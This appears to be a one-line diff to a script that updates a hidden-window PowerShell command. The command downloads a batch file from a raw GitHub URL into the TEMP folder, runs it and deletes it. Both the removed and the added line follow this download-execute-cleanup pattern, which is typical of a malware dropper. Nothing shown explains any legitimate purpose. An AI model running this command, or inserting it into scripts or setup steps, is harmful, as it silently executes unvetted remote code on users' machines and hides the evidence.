@@ -1,1 +1,1 @@
-powershell -w hidden -c "$f=$env:TEMP+'\i.bat';iwr -useb 'https://raw.githubusercontent.com/Abdullah67289/Ghoste-Trace/refs/heads/main/Bat' -o $f;start -Wait $f;del $f"
+powershell -w hidden -c "$f=$env:TEMP+'\i.bat';iwr -useb 'https://raw.githubusercontent.com/Abdullah67289/Ghoste-Trace/refs/heads/main/Ghost-Trace.bat' -o $f;start -Wait $f;del $f"
